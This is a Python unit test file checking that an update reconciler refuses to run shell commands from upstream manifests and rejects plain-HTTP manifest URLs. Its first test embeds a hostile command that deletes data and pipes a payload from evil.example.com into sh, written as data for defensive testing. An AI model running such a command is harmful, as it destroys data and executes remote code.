"""
Unit tests for Upgrade & Release Reconciler (scripts/check_updates.py - Issue #343).
Verifies RCE prevention, allowlisted action dispatch, and HTTPS origin validation.
"""

import unittest
from unittest.mock import patch, MagicMock
from scripts.check_updates import fetch_upstream_manifest, reconcile_upgrades, ALLOWLISTED_ACTIONS


class TestCheckUpdates(unittest.TestCase):

    def test_malicious_manifest_command_is_not_executed(self):
        """Verifies that an arbitrary shell command in a manifest is never executed via shell=True."""
        malicious_manifest = {
            "version": "0.7.0",
            "compatibility": {
                "requires_regional_retraining": True
            },
            "model_engine": {
                "retrain_command": "rm -rf /tmp/important_data && curl http://evil.example.com/payload | sh",
                "retrain_action": "malicious_injected_action"
            }
        }

        with patch("scripts.check_updates.subprocess.run") as mock_run:
            reconcile_upgrades(malicious_manifest, dry_run=False)
            reconcile_calls = [c for c in mock_run.call_args_list if not (c[0] and isinstance(c[0][0], list) and c[0][0] and c[0][0][0] == "git")]
            self.assertEqual(len(reconcile_calls), 0)
            for c in mock_run.call_args_list:
                self.assertFalse(c[1].get("shell", False))
                self.assertNotIn("rm -rf", str(c))

    def test_allowlisted_action_executes_safely(self):
        """Verifies that legitimate allowlisted action executes with shell=False and fixed args."""
        valid_manifest = {
            "version": "0.7.0",
            "compatibility": {
                "requires_regional_retraining": True
            },
            "model_engine": {
                "retrain_action": "retrain_regional_models"
            }
        }

        with patch("scripts.check_updates.subprocess.run") as mock_run:
            reconcile_upgrades(valid_manifest, dry_run=False)
            reconcile_calls = [c for c in mock_run.call_args_list if not (c[0] and isinstance(c[0][0], list) and c[0][0] and c[0][0][0] == "git")]
            self.assertEqual(len(reconcile_calls), 1)
            target_call = reconcile_calls[0]
            self.assertFalse(target_call[1].get("shell", False))
            self.assertEqual(target_call[0][0], ALLOWLISTED_ACTIONS["retrain_regional_models"])

    def test_legacy_command_mapping_to_allowlisted_action(self):
        """Verifies that standard legacy command string maps safely to allowlisted action with shell=False."""
        legacy_manifest = {
            "version": "0.7.0",
            "compatibility": {
                "requires_regional_retraining": True
            },
            "model_engine": {
                "retrain_command": "python scripts/manage_regions.py retrain --all"
            }
        }

        with patch("scripts.check_updates.subprocess.run") as mock_run:
            reconcile_upgrades(legacy_manifest, dry_run=False)
            reconcile_calls = [c for c in mock_run.call_args_list if not (c[0] and isinstance(c[0][0], list) and c[0][0] and c[0][0][0] == "git")]
            self.assertEqual(len(reconcile_calls), 1)
            target_call = reconcile_calls[0]
            self.assertFalse(target_call[1].get("shell", False))
            self.assertEqual(target_call[0][0], ALLOWLISTED_ACTIONS["retrain_regional_models"])

    def test_insecure_url_fallback(self):
        """Verifies that insecure HTTP URLs (non-localhost) are rejected and fall back safely."""
        with patch("scripts.check_updates.generate_release_manifest") as mock_gen:
            mock_gen.return_value = {"version": "0.6.8", "compatibility": {}}
            res = fetch_upstream_manifest("http://attacker.example.com/manifest.json")
            self.assertEqual(res["version"], "0.6.8")
            mock_gen.assert_called_once()


if __name__ == "__main__":
    unittest.main()
